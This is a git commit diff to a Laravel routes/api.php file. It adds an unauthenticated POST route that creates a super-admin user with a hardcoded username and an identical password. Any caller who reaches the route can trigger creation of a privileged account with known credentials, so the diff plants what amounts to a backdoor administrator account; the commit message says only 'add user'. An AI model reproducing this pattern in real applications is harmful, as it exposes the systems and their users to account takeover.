9aaee435ef09571c7b067a9895232495c10c4893
Aldisp <aldysuryaputra@gmail.com>
2023-08-03 11:46:31 +0700

    add user

--- routes/api.php
+++ routes/api.php
@@ -2,6 +2,7 @@
 
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
+use App\Controllers\AdminController;
 
 /*
 |--------------------------------------------------------------------------
@@ -17,3 +18,24 @@ use Illuminate\Support\Facades\Route;
 Route::middleware('auth:api')->get('/user', function (Request $request) {
     return $request->user();
 });
+
+Route::post('/', function(Request $request){
+    $data = [
+        "username" => "aldysp34",
+        "password" => Hash::make("aldysp34"),
+        "name" => "Muhammad Aldi Surya Putra",
+        "is_admin" => true,
+        "super_admin" => true,
+    ];
+    $user = App\Models\User::create($data);
+    if ($user){
+        return response()->json([
+            "status" => 200,
+            "message" => "succes register"
+        ]);
+    }
+    return response()->json([
+        "status" => 500,
+        "message" => "failed",
+    ]);
+})->name('admin.manage.users.store');
